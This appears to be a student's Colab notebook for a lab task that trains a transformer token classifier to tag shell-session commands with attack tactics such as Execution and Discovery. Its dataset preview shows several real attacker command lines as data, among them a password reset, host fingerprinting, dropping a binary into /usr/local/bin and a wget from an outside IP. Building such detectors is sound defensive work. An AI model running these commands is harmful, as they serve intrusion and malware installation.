{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "996562b2",
   "metadata": {},
   "source": [
    "# Task 4"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5919201a",
   "metadata": {},
   "source": [
    "## Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9afbe41d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python 3.12.12\n",
      "Requirement already satisfied: pip in /usr/local/lib/python3.12/dist-packages (24.1.2)\n",
      "Collecting pip\n",
      "  Downloading pip-25.3-py3-none-any.whl.metadata (4.7 kB)\n",
      "Downloading pip-25.3-py3-none-any.whl (1.8 MB)\n",
      "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.8/1.8 MB\u001b[0m \u001b[31m30.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
      "\u001b[?25hInstalling collected packages: pip\n",
      "  Attempting uninstall: pip\n",
      "    Found existing installation: pip 24.1.2\n",
      "    Uninstalling pip-24.1.2:\n",
      "      Successfully uninstalled pip-24.1.2\n",
      "Successfully installed pip-25.3\n"
     ]
    }
   ],
   "source": [
    "# --- Check Python and pip versions ---\n",
    "!python --version\n",
    "!pip install --upgrade pip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e30a6995",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: torch in /usr/local/lib/python3.12/dist-packages (2.9.0+cu126)\n",
      "Requirement already satisfied: filelock in /usr/local/lib/python3.12/dist-packages (from torch) (3.20.0)\n",
      "Requirement already satisfied: typing-extensions>=4.10.0 in /usr/local/lib/python3.12/dist-packages (from torch) (4.15.0)\n",
      "Requirement already satisfied: setuptools in /usr/local/lib/python3.12/dist-packages (from torch) (75.2.0)\n",
      "Requirement already satisfied: sympy>=1.13.3 in /usr/local/lib/python3.12/dist-packages (from torch) (1.14.0)\n",
      "Requirement already satisfied: networkx>=2.5.1 in /usr/local/lib/python3.12/dist-packages (from torch) (3.6.1)\n",
      "Requirement already satisfied: jinja2 in /usr/local/lib/python3.12/dist-packages (from torch) (3.1.6)\n",
      "Requirement already satisfied: fsspec>=0.8.5 in /usr/local/lib/python3.12/dist-packages (from torch) (2025.3.0)\n",
      "Requirement already satisfied: nvidia-cuda-nvrtc-cu12==12.6.77 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.77)\n",
      "Requirement already satisfied: nvidia-cuda-runtime-cu12==12.6.77 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.77)\n",
      "Requirement already satisfied: nvidia-cuda-cupti-cu12==12.6.80 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.80)\n",
      "Requirement already satisfied: nvidia-cudnn-cu12==9.10.2.21 in /usr/local/lib/python3.12/dist-packages (from torch) (9.10.2.21)\n",
      "Requirement already satisfied: nvidia-cublas-cu12==12.6.4.1 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.4.1)\n",
      "Requirement already satisfied: nvidia-cufft-cu12==11.3.0.4 in /usr/local/lib/python3.12/dist-packages (from torch) (11.3.0.4)\n",
      "Requirement already satisfied: nvidia-curand-cu12==10.3.7.77 in /usr/local/lib/python3.12/dist-packages (from torch) (10.3.7.77)\n",
      "Requirement already satisfied: nvidia-cusolver-cu12==11.7.1.2 in /usr/local/lib/python3.12/dist-packages (from torch) (11.7.1.2)\n",
      "Requirement already satisfied: nvidia-cusparse-cu12==12.5.4.2 in /usr/local/lib/python3.12/dist-packages (from torch) (12.5.4.2)\n",
      "Requirement already satisfied: nvidia-cusparselt-cu12==0.7.1 in /usr/local/lib/python3.12/dist-packages (from torch) (0.7.1)\n",
      "Requirement already satisfied: nvidia-nccl-cu12==2.27.5 in /usr/local/lib/python3.12/dist-packages (from torch) (2.27.5)\n",
      "Requirement already satisfied: nvidia-nvshmem-cu12==3.3.20 in /usr/local/lib/python3.12/dist-packages (from torch) (3.3.20)\n",
      "Requirement already satisfied: nvidia-nvtx-cu12==12.6.77 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.77)\n",
      "Requirement already satisfied: nvidia-nvjitlink-cu12==12.6.85 in /usr/local/lib/python3.12/dist-packages (from torch) (12.6.85)\n",
      "Requirement already satisfied: nvidia-cufile-cu12==1.11.1.6 in /usr/local/lib/python3.12/dist-packages (from torch) (1.11.1.6)\n",
      "Requirement already satisfied: triton==3.5.0 in /usr/local/lib/python3.12/dist-packages (from torch) (3.5.0)\n",
      "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.12/dist-packages (from sympy>=1.13.3->torch) (1.3.0)\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.12/dist-packages (from jinja2->torch) (3.0.3)\n",
      "Requirement already satisfied: numpy in /usr/local/lib/python3.12/dist-packages (2.0.2)\n",
      "Requirement already satisfied: pandas in /usr/local/lib/python3.12/dist-packages (2.2.2)\n",
      "Requirement already satisfied: scikit-learn in /usr/local/lib/python3.12/dist-packages (1.6.1)\n",
      "Requirement already satisfied: matplotlib in /usr/local/lib/python3.12/dist-packages (3.10.0)\n",
      "Requirement already satisfied: seaborn in /usr/local/lib/python3.12/dist-packages (0.13.2)\n",
      "Requirement already satisfied: python-dateutil>=2.8.2 in /usr/local/lib/python3.12/dist-packages (from pandas) (2.9.0.post0)\n",
      "Requirement already satisfied: pytz>=2020.1 in /usr/local/lib/python3.12/dist-packages (from pandas) (2025.2)\n",
      "Requirement already satisfied: tzdata>=2022.7 in /usr/local/lib/python3.12/dist-packages (from pandas) (2025.2)\n",
      "Requirement already satisfied: scipy>=1.6.0 in /usr/local/lib/python3.12/dist-packages (from scikit-learn) (1.16.3)\n",
      "Requirement already satisfied: joblib>=1.2.0 in /usr/local/lib/python3.12/dist-packages (from scikit-learn) (1.5.2)\n",
      "Requirement already satisfied: threadpoolctl>=3.1.0 in /usr/local/lib/python3.12/dist-packages (from scikit-learn) (3.6.0)\n",
      "Requirement already satisfied: contourpy>=1.0.1 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (1.3.3)\n",
      "Requirement already satisfied: cycler>=0.10 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (0.12.1)\n",
      "Requirement already satisfied: fonttools>=4.22.0 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (4.61.0)\n",
      "Requirement already satisfied: kiwisolver>=1.3.1 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (1.4.9)\n",
      "Requirement already satisfied: packaging>=20.0 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (25.0)\n",
      "Requirement already satisfied: pillow>=8 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (11.3.0)\n",
      "Requirement already satisfied: pyparsing>=2.3.1 in /usr/local/lib/python3.12/dist-packages (from matplotlib) (3.2.5)\n",
      "Requirement already satisfied: six>=1.5 in /usr/local/lib/python3.12/dist-packages (from python-dateutil>=2.8.2->pandas) (1.17.0)\n",
      "Requirement already satisfied: tqdm in /usr/local/lib/python3.12/dist-packages (4.67.1)\n"
     ]
    }
   ],
   "source": [
    "# --- Install required libraries ---\n",
    "!pip install torch\n",
    "!pip install numpy pandas scikit-learn matplotlib seaborn\n",
    "!pip install tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f355596",
   "metadata": {},
   "outputs": [],
   "source": [
    "# --- Import libraries ---\n",
    "import os\n",
    "import time\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "import json\n",
    "\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.preprocessing import StandardScaler, MinMaxScaler, RobustScaler, LabelEncoder\n",
    "from sklearn.utils.class_weight import compute_class_weight\n",
    "from sklearn.metrics import classification_report, confusion_matrix, accuracy_score, f1_score\n",
    "from sklearn.decomposition import PCA\n",
    "from sklearn.impute import SimpleImputer\n",
    "\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.optim as optim\n",
    "from torch.utils.data import Dataset, DataLoader, TensorDataset\n",
    "\n",
    "from tqdm import tqdm"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b792b97a",
   "metadata": {},
   "source": [
    "### Colab Pro"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e2dda504",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Wed Dec 17 15:55:27 2025       \n",
      "+-----------------------------------------------------------------------------------------+\n",
      "| NVIDIA-SMI 550.54.15              Driver Version: 550.54.15      CUDA Version: 12.4     |\n",
      "|-----------------------------------------+------------------------+----------------------+\n",
      "| GPU  Name                 Persistence-M | Bus-Id          Disp.A | Volatile Uncorr. ECC |\n",
      "| Fan  Temp   Perf          Pwr:Usage/Cap |           Memory-Usage | GPU-Util  Compute M. |\n",
      "|                                         |                        |               MIG M. |\n",
      "|=========================================+========================+======================|\n",
      "|   0  Tesla T4                       Off |   00000000:00:04.0 Off |                    0 |\n",
      "| N/A   45C    P8             10W /   70W |       0MiB /  15360MiB |      0%      Default |\n",
      "|                                         |                        |                  N/A |\n",
      "+-----------------------------------------+------------------------+----------------------+\n",
      "                                                                                         \n",
      "+-----------------------------------------------------------------------------------------+\n",
      "| Processes:                                                                              |\n",
      "|  GPU   GI   CI        PID   Type   Process name                              GPU Memory |\n",
      "|        ID   ID                                                               Usage      |\n",
      "|=========================================================================================|\n",
      "|  No running processes found                                                             |\n",
      "+-----------------------------------------------------------------------------------------+\n"
     ]
    }
   ],
   "source": [
    "# --- Check GPU availability ---\n",
    "gpu_info = !nvidia-smi\n",
    "gpu_info = '\\n'.join(gpu_info)\n",
    "if gpu_info.find('failed') >= 0:\n",
    "  print('Not connected to a GPU')\n",
    "else:\n",
    "  print(gpu_info)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff3645ab",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your runtime has 13.6 gigabytes of available RAM\n",
      "\n",
      "Not using a high-RAM runtime\n"
     ]
    }
   ],
   "source": [
    "# --- Check RAM availability ---\n",
    "from psutil import virtual_memory\n",
    "ram_gb = virtual_memory().total / 1e9\n",
    "print('Your runtime has {:.1f} gigabytes of available RAM\\n'.format(ram_gb))\n",
    "\n",
    "if ram_gb < 20:\n",
    "  print('Not using a high-RAM runtime')\n",
    "else:\n",
    "  print('You are using a high-RAM runtime!')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7982656a",
   "metadata": {},
   "source": [
    "### Paths setup\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82fa3083",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Mounted at /content/drive\n"
     ]
    }
   ],
   "source": [
    "# --- Mount Google Drive (for Google Colab users) ---\n",
    "from google.colab import drive\n",
    "drive.mount('/content/drive')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4ff2316",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Project path: /content/drive/MyDrive/Projects/Laboratory4/\n",
      "Data path: /content/drive/MyDrive/Projects/Laboratory4/data/\n",
      "Results path: /content/drive/MyDrive/Projects/Laboratory4/results/\n"
     ]
    }
   ],
   "source": [
    "# --- Define Paths ---\n",
    "laboratory = 'Laboratory4'\n",
    "\n",
    "base_path = '/content/drive/MyDrive/'\n",
    "project_path = base_path + f'Projects/{laboratory}/'\n",
    "data_path = project_path + 'data/'\n",
    "results_path = project_path + 'results/'\n",
    "\n",
    "# Ensure directories exist\n",
    "os.makedirs(project_path, exist_ok=True)\n",
    "os.makedirs(data_path, exist_ok=True)\n",
    "os.makedirs(results_path, exist_ok=True)\n",
    "\n",
    "print(f\"Project path: {project_path}\")\n",
    "print(f\"Data path: {data_path}\")\n",
    "print(f\"Results path: {results_path}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f85bdc7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "from transformers import AutoTokenizer\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "\n",
    "from sklearn.metrics import f1_score, precision_score, recall_score, accuracy_score\n",
    "from itertools import chain\n",
    "from copy import deepcopy\n",
    "\n",
    "from transformers import AutoModelForTokenClassification, AutoConfig, get_scheduler\n",
    "from transformers import DataCollatorForTokenClassification\n",
    "\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import classification_report\n",
    "from datasets import Dataset, DatasetDict\n",
    "from torch import cuda\n",
    "\n",
    "from tqdm.auto import tqdm\n",
    "import torch\n",
    "\n",
    "from torch.utils.data import DataLoader\n",
    "from torch.optim import AdamW"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "62d5c152",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.google.colaboratory.intrinsic+json": {
       "type": "string"
      },
      "text/plain": [
       "'cuda'"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "device = 'cuda' if cuda.is_available() else 'cpu'\n",
    "device"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32604296",
   "metadata": {},
   "outputs": [],
   "source": [
    "# ============================================================================\n",
    "# GLOBAL CONFIGURATION: Plot Saving\n",
    "# ============================================================================\n",
    "SAVE_PLOTS = 1\n",
    "# ============================================================================\n",
    "\n",
    "REPORT_IMAGES_DIR = '../plots/Task1'\n",
    "os.makedirs(REPORT_IMAGES_DIR, exist_ok=True)\n",
    "\n",
    "def save_figure_for_report(filename, dpi=300, bbox_inches='tight'):\n",
    "    \"\"\"\n",
    "    Save the current matplotlib figure for use in the report.\n",
    "\n",
    "    Args:\n",
    "        filename: Name of the file (e.g., 'class_distribution.png')\n",
    "        dpi: Resolution (default 300 for high quality)\n",
    "        bbox_inches: Bounding box setting (default 'tight' to remove whitespace)\n",
    "    \"\"\"\n",
    "    if not SAVE_PLOTS:\n",
    "        return  # Skip saving if flag is disabled or filename missing\n",
    "\n",
    "    filepath = os.path.join(REPORT_IMAGES_DIR, filename)\n",
    "    plt.savefig(filepath, dpi=dpi, bbox_inches=bbox_inches)\n",
    "    print(f\"Figure saved to: {filepath}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5ed6ed3d",
   "metadata": {},
   "source": [
    "### Helper Functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90dd08d1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def compute_metrics(full_predictions, full_labels):\n",
    "    \"\"\"\n",
    "    Calculate both token-level and sentence-level metrics for token classification.\n",
    "    Args:\n",
    "        full_predictions: List of lists of predicted labels\n",
    "        full_labels: List of lists of true labels\n",
    "    Returns:\n",
    "        dict: Dictionary containing calculated metrics\n",
    "    \"\"\"\n",
    "    # Token-level metrics\n",
    "    # Flatten predictions and labels > create a single, long list\n",
    "    flat_predictions = list(chain(*full_predictions))\n",
    "    flat_labels = list(chain(*full_labels))\n",
    "    # Calculate standard classification metrics\n",
    "    token_accuracy = accuracy_score(flat_labels, flat_predictions)\n",
    "    token_precision = precision_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
    "    token_recall = recall_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
    "    token_f1 = f1_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
    "    # Return all metrics in a dictionary\n",
    "    metrics = {\n",
    "        \"token_accuracy\": token_accuracy,\n",
    "        \"token_precision\": token_precision,\n",
    "        \"token_recall\": token_recall,\n",
    "        \"token_f1\": token_f1,\n",
    "    }\n",
    "    return metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f3956ef",
   "metadata": {},
   "outputs": [],
   "source": [
    "def plot_stats(title, training_losses, validation_losses=None, best_epoch=None):\n",
    "    # Set style for better-looking plots\n",
    "    plt.style.use('seaborn-v0_8-paper')\n",
    "    # Define a common color scheme\n",
    "    colors = {\n",
    "        'training': '#2E86C1',    # Deep blue\n",
    "        'validation': '#27AE60',\n",
    "        'best_epoch': '#E74C3C',  # Red\n",
    "    }\n",
    "    if validation_losses is not None:\n",
    "        # Create a figure with 2 subplots\n",
    "        fig, ((ax1, ax2)) = plt.subplots(1, 2, figsize=(5,3))\n",
    "    else:\n",
    "        fig, ax1 = plt.subplots(1, figsize=(5,4))\n",
    "\n",
    "    # Plot data with enhanced styling\n",
    "    ax1.plot(training_losses, color=colors['training'], linewidth=2)\n",
    "    ax1.set_title('Training Loss', fontsize=12, pad=10)\n",
    "    ax1.set_ylabel('Loss', fontsize=10)\n",
    "    ax1.set_xlabel('Training Steps', fontsize=10)\n",
    "\n",
    "    if validation_losses is not None:\n",
    "        ax1.axvline(x=best_epoch, color=colors['best_epoch'], linestyle='--', alpha=0.8, label='Best Epoch')\n",
    "        ax2.plot(validation_losses, color=colors['validation'], linewidth=2)\n",
    "        ax2.axvline(x=best_epoch, color=colors['best_epoch'], linestyle='--', alpha=0.8, label='Best Epoch')\n",
    "        ax2.set_title('Validation Loss', fontsize=12, pad=10)\n",
    "        ax2.set_ylabel('Loss', fontsize=10)\n",
    "        ax2.set_xlabel('Training Steps', fontsize=10)\n",
    "        axs = [ax1, ax2]\n",
    "    else:\n",
    "        axs = [ax1]\n",
    "    # Add grid to all subplots with better styling\n",
    "    for ax in axs:\n",
    "        ax.grid(True, linestyle='--', alpha=0.7)\n",
    "        ax.spines['top'].set_visible(False)\n",
    "        ax.spines['right'].set_visible(False)\n",
    "        if len(axs)>1:\n",
    "            ax.legend(fontsize=8)\n",
    "    # Add a main title\n",
    "    fig.suptitle(f'{title} - Training Losses', fontsize=14, y=1.02)\n",
    "    # Adjust the layout\n",
    "    plt.tight_layout()\n",
    "    # Display the plot\n",
    "    plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54f72b89",
   "metadata": {},
   "outputs": [],
   "source": [
    "def training_loop(model, optimizer, lr_scheduler):\n",
    "    best_val_loss, best_epoch = np.inf, 0\n",
    "    best_model = deepcopy(model).to(device)\n",
    "\n",
    "    progress_bar = tqdm(range(num_training_steps))\n",
    "    val_losses, train_losses = [], [] # Lists to keep track of the training and validation losses\n",
    "\n",
    "    for epoch in range(N_TRAIN_EPOCHS):\n",
    "        # Training\n",
    "        model.train()\n",
    "        train_loss = 0\n",
    "        for batch in train_dataloader:\n",
    "            batch = {key:value.to(device) for key, value in batch.items()}\n",
    "            # Model expects:\n",
    "            # - input_ids > i.e., which tokens we must map into the embeddings\n",
    "            # - attention_mask > who shall each token pays attention to\n",
    "            # - labels > the NER tags\n",
    "            outputs = model(input_ids=batch[\"input_ids\"],\n",
    "                            attention_mask=batch[\"attention_mask\"],\n",
    "                            labels=batch[\"labels\"]\n",
    "            )\n",
    "            # Notice: the model already comes with a CrossEntropy loss\n",
    "            # - if `labels` are defined, a loss is also computed\n",
    "            loss = outputs.loss\n",
    "            train_loss += loss.detach().cpu().clone().numpy()\n",
    "            loss.backward()\n",
    "            optimizer.step()\n",
    "            lr_scheduler.step()\n",
    "            optimizer.zero_grad()\n",
    "            progress_bar.update(1)\n",
    "        train_losses.append(train_loss/len(train_dataloader))\n",
    "        # Evaluation\n",
    "        model.eval()\n",
    "        full_predictions, full_labels = [], []\n",
    "        val_loss = 0\n",
    "        for batch in eval_dataloader:\n",
    "            batch = {key:value.to(device) for key, value in batch.items()}\n",
    "            with torch.no_grad():\n",
    "                outputs = model(**batch)\n",
    "            val_loss += outputs.loss.detach().cpu().clone().numpy()\n",
    "            # Extract the predictions\n",
    "            predictions = outputs.logits.argmax(dim=-1)\n",
    "            labels = batch[\"labels\"]\n",
    "            true_predictions, true_labels = postprocess(predictions, labels)\n",
    "            full_predictions+=true_predictions\n",
    "            full_labels+=true_labels\n",
    "        val_loss = val_loss/len(eval_dataloader)\n",
    "        val_losses.append(val_loss)\n",
    "        metrics = compute_metrics(full_predictions, full_labels)\n",
    "        print(\n",
    "            f\"epoch {epoch}:\",\n",
    "            {\n",
    "                key: metrics[key]\n",
    "                for key in [\"token_accuracy\", \"token_f1\"]\n",
    "            },\n",
    "        )\n",
    "        if val_loss <= best_val_loss:\n",
    "            best_epoch = epoch\n",
    "            best_val_loss = val_loss\n",
    "            best_model = deepcopy(model).to(device)\n",
    "\n",
    "    return best_model, best_epoch, best_val_loss, train_losses, val_losses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7906b5c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Evaluation\n",
    "def evaluate_model(model, best_model):\n",
    "  model.eval()\n",
    "  full_predictions, full_labels = [], []\n",
    "  for batch in test_dataloader:\n",
    "      batch = {key:value.to(device) for key, value in batch.items()}\n",
    "      with torch.no_grad():\n",
    "          # Another way to pass the items to the model\n",
    "          outputs = best_model(**batch)\n",
    "      # Extract the predictions\n",
    "      predictions = outputs.logits.argmax(dim=-1)\n",
    "      labels = batch[\"labels\"]\n",
    "      true_predictions, true_labels = postprocess(predictions, labels)\n",
    "      full_predictions+=true_predictions\n",
    "      full_labels+=true_labels\n",
    "  test_metrics = compute_metrics(full_predictions, full_labels)\n",
    "\n",
    "  return full_predictions, full_labels, test_metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "639cc813",
   "metadata": {},
   "outputs": [],
   "source": [
    "def print_classification_report(true_labels, true_predictions):\n",
    "  # 1. Token classification accuracy, 2. Macro precision, recall, f1\n",
    "  flat_preds = list(chain(*true_predictions))\n",
    "  flat_labels = list(chain(*true_labels))\n",
    "\n",
    "  token_accuracy = accuracy_score(flat_labels, flat_preds)\n",
    "  token_precision = precision_score(flat_labels, flat_preds, average='macro', zero_division=0)\n",
    "  token_recall = recall_score(flat_labels, flat_preds, average='macro', zero_division=0)\n",
    "  token_f1 = f1_score(flat_labels, flat_preds, average='macro', zero_division=0)\n",
    "\n",
    "  print(f\"Token classification accuracy: {token_accuracy:.4f}\")\n",
    "  print(f\"Macro precision: {token_precision:.4f}\")\n",
    "  print(f\"Macro recall: {token_recall:.4f}\")\n",
    "  print(f\"Macro F1-score: {token_f1:.4f}\")\n",
    "\n",
    "  # Get all class names in the correct order\n",
    "  class_names = [id2label[i] for i in sorted(id2label.keys())]\n",
    "\n",
    "  # 3. Per-class f1-score barplot\n",
    "  report = classification_report(\n",
    "      flat_labels, flat_preds,\n",
    "      labels=class_names,\n",
    "      target_names=class_names,\n",
    "      output_dict=True,\n",
    "      zero_division=0\n",
    "  )\n",
    "  per_class_f1 = {label: report[label]['f1-score'] for label in class_names}\n",
    "\n",
    "  plt.figure(figsize=(8,4))\n",
    "  sns.barplot(x=list(per_class_f1.keys()), y=list(per_class_f1.values()))\n",
    "  plt.title(\"Per-class F1-score\")\n",
    "  plt.ylabel(\"F1-score\")\n",
    "  plt.xlabel(\"Class\")\n",
    "  plt.xticks(rotation=45)\n",
    "  plt.tight_layout()\n",
    "  plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34ad9755",
   "metadata": {},
   "source": [
    "### Start"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c31478c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The dataset contains 251 elements\n"
     ]
    },
    {
     "data": {
      "application/vnd.google.colaboratory.intrinsic+json": {
       "summary": "{\n  \"name\": \"train_df\",\n  \"rows\": 251,\n  \"fields\": [\n    {\n      \"column\": \"session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 251,\n        \"samples\": [\n          \"ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* ; /ip cloud print ; echo Hi | cat -n ;\",\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo -e rameauxnvRPi4Y820jEonvRPi4Y820jEo | passwd | bash ; echo rameauxnvRPi4Y820jEonvRPi4Y820jEon | passwd ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin rameaux > /tmp/up.txt ; rm -rf /var/tmp/dota* ;\",\n          \"/usr/bin/cat > /usr/libexec/ofhewv ; scp -tr /usr/local/bin/ ; C0755 3435380 ofhewv ; /usr/bin/tar Pxvf - ; /usr/bin/tee /usr/local/bin/ofhewv > /dev/null ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}",
       "type": "dataframe",
       "variable_name": "train_df"
      },
      "text/html": [
       "\n",
       "  <div id=\"df-a6053033-d22f-4682-ab20-b39ec0766bcf\" class=\"colab-df-container\">\n",
       "    <div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
       "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
       "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>\n",
       "    <div class=\"colab-df-buttons\">\n",
       "\n",
       "  <div class=\"colab-df-container\">\n",
       "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-a6053033-d22f-4682-ab20-b39ec0766bcf')\"\n",
       "            title=\"Convert this dataframe to an interactive table.\"\n",
       "            style=\"display:none;\">\n",
       "\n",
       "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
       "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
       "  </svg>\n",
       "    </button>\n",
       "\n",
       "  <style>\n",
       "    .colab-df-container {\n",
       "      display:flex;\n",
       "      gap: 12px;\n",
       "    }\n",
       "\n",
       "    .colab-df-convert {\n",
       "      background-color: #E8F0FE;\n",
       "      border: none;\n",
       "      border-radius: 50%;\n",
       "      cursor: pointer;\n",
       "      display: none;\n",
       "      fill: #1967D2;\n",
       "      height: 32px;\n",
       "      padding: 0 0 0 0;\n",
       "      width: 32px;\n",
       "    }\n",
       "\n",
       "    .colab-df-convert:hover {\n",
       "      background-color: #E2EBFA;\n",
       "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
       "      fill: #174EA6;\n",
       "    }\n",
       "\n",
       "    .colab-df-buttons div {\n",
       "      margin-bottom: 4px;\n",
       "    }\n",
       "\n",
       "    [theme=dark] .colab-df-convert {\n",
       "      background-color: #3B4455;\n",
       "      fill: #D2E3FC;\n",
       "    }\n",
       "\n",
       "    [theme=dark] .colab-df-convert:hover {\n",
       "      background-color: #434B5C;\n",
       "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
       "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
       "      fill: #FFFFFF;\n",
       "    }\n",
       "  </style>\n",
       "\n",
       "    <script>\n",
       "      const buttonEl =\n",
       "        document.querySelector('#df-a6053033-d22f-4682-ab20-b39ec0766bcf button.colab-df-convert');\n",
       "      buttonEl.style.display =\n",
       "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
       "\n",
       "      async function convertToInteractive(key) {\n",
       "        const element = document.querySelector('#df-a6053033-d22f-4682-ab20-b39ec0766bcf');\n",
       "        const dataTable =\n",
       "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
       "                                                    [key], {});\n",
       "        if (!dataTable) return;\n",
       "\n",
       "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
       "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
       "          + ' to learn more about interactive tables.';\n",
       "        element.innerHTML = '';\n",
       "        dataTable['output_type'] = 'display_data';\n",
       "        await google.colab.output.renderOutput(dataTable, element);\n",
       "        const docLink = document.createElement('div');\n",
